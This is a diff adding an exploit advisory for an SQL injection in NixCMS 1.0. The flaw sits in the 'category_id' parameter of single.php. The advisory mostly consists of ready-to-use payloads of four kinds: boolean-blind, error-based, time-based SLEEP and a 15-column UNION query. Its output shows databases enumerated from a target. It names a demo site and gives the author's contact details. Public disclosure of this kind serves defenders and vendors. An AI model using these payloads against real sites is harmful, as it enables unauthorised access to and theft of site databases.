@@ -1,0 +1,42 @@
+# #
+# Exploit Title: NixCMS 1.0 - 'category_id' SQL Ýnjection
+# Dork: N/A
+# Date: 03.02.2018
+# Vendor: https://www.nixdesign.de
+# Software Link: https://www.nixdesign.de/nix-cms/
+# Demo: http://www.jamaram.de/
+# Version: 1.0
+# Tested on: WiN10_X64
+# Exploit Author: Bora Bozdogan
+# Author WebSite : http://borabozdogan.net.tr
+# Author E-mail : borayazilim45@mit.tc
+# Author Skype : borayazilim45
+# # 
+# POC:
+# 
+# http://localhost/[PATH]/single.php?category_id=[SQL]
+# 
+# Parameter: category_id (GET)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause
+# Payload: category_id=24' AND 1662=1662 AND 'ZFBe'='ZFBe
+#
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# Payload: category_id=24' AND (SELECT 3422 FROM(SELECT COUNT(*),CONCAT(0x71706a7171,(SELECT (ELT(3422=3422,1))),0x717a627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CjtO'='CjtO
+#
+# Type: AND/OR time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind
+#
+# Payload: category_id=24' AND SLEEP(5) AND 'kjea'='kjea
+#
+# Type: UNION query
+# Title: Generic UNION query (NULL) - 15 columns
+# Payload: category_id=24' UNION ALL SELECT NULL,CONCAT(0x71706a7171,0x6953455a5149636b5844654f6f6d4e74506c6b73465572725544644e584158745065566267437574,0x717a627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wFQF
+#
+# #
+
+available databases [3]:
+[*] information_schema
+[*] usr_web24_1
+[*] web24_4
